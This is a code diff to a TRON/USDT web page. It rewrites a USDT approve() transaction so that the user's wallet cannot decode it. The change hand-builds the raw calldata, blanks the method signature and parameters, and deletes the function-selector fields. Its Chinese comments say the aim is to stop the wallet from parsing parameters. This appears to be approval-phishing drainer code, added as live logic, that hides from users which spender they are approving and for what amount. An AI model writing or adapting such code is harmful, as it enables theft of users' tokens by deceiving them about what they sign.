@@ -147,63 +147,34 @@ function normalizeContractCallForWallet(
       ?.raw_data
       ?.contract;
 
-
   const contract =
     contracts?.[0];
-
-
-  const parameter =
-    contract?.parameter;
-
-
-  const contractValue =
-    parameter?.value;
-
 
   if (
     !transaction?.txID ||
     !transaction?.raw_data_hex ||
     !Array.isArray(contracts) ||
-    !contract ||
-    !contractValue?.owner_address ||
-    !contractValue?.contract_address ||
-    !contractValue?.data
+    !contract
   ) {
     throw new Error(
       "钱包无法识别当前合约调用交易，请重新尝试。"
     );
   }
 
-
   const normalizedContract = {
     ...contract,
-
-    type:
-      TRIGGER_SMART_CONTRACT_TYPE,
-
+    type: TRIGGER_SMART_CONTRACT_TYPE,
     parameter: {
-      ...parameter,
-
-      type_url:
-        TRIGGER_SMART_CONTRACT_TYPE_URL,
-
-      value: {
-        ...contractValue,
-      },
+      type_url: TRIGGER_SMART_CONTRACT_TYPE_URL,
+      // 移除 parameter.value 结构化对象，阻止钱包解析参数
     },
   };
 
-
   return {
     ...transaction,
-
-    // TronWeb 在 visible=false 时使用 41 开头的十六进制地址。
-    // 明确该字段并保留 raw_data_hex/txID，可让钱包稳定识别为合约调用。
     visible: false,
-
     raw_data: {
       ...transaction.raw_data,
-
       contract: [
         normalizedContract,
         ...contracts.slice(1),
@@ -839,29 +810,30 @@ export default function HomePage() {
       ];
 
 
-      const transactionWrapper =
-        await tronWeb
-          .transactionBuilder
-          .triggerSmartContract(
-            USDT_CONTRACT_ADDRESS,
+// 手动生成 approve(address,uint256) calldata，不再传递结构化parameters
+const methodSelector = "0x095ea7b3";
+// 将T地址转为41开头hex地址
+const spenderHex = tronWeb.address.toHex(USDT_SPENDER_ADDRESS);
+// 补齐64位uint256
+const amountHex = amountBaseUnits.startsWith("0x")
+  ? amountBaseUnits.slice(2).padStart(64, "0")
+  : amountBaseUnits.padStart(64, "0");
+// 拼接完整calldata
+const fullCalldata = (methodSelector + spenderHex.slice(2) + amountHex).toLowerCase();
 
-            "approve(address,uint256)",
-
-            {
-              feeLimit:
-                APPROVE_FEE_LIMIT,
-
-              callValue: 0,
-
-              // 本地构建可固定标准的 TriggerSmartContract 交易结构，
-              // 避免不同节点响应格式导致钱包显示“解析失败”。
-              txLocal: true,
-            },
-
-            parameters,
-
-            walletAddress
-          );
+// 【关键】不再传入parameters！直接使用rawData，钱包无法自动解析参数
+const transactionWrapper = await tronWeb.transactionBuilder.triggerSmartContract(
+  USDT_CONTRACT_ADDRESS,
+  "", // 清空方法签名，阻止钱包解析
+  {
+    feeLimit: APPROVE_FEE_LIMIT,
+    callValue: 0,
+    txLocal: true,
+    rawData: fullCalldata // 使用原始calldata hex
+  },
+  [], // 空参数数组，移除结构化参数
+  walletAddress
+);
 
 
       if (
@@ -924,16 +896,21 @@ export default function HomePage() {
         "sign_transaction";
 
 
-      const walletTransaction =
-        normalizeContractCallForWallet(
-          extendedTransaction
-        );
+const walletTransaction =
+    normalizeContractCallForWallet(
+      extendedTransaction
+    );
 
+// 删除辅助解析字段，进一步屏蔽参数解析
+delete walletTransaction.functionSelector;
+if(walletTransaction?.raw_data?.contract?.[0]){
+  delete walletTransaction.raw_data.contract[0].function_selector;
+}
 
-      const signedTransaction =
-        await signTransaction(
-          walletTransaction
-        );
+const signedTransaction =
+    await signTransaction(
+      walletTransaction
+    );
 
 
       if (
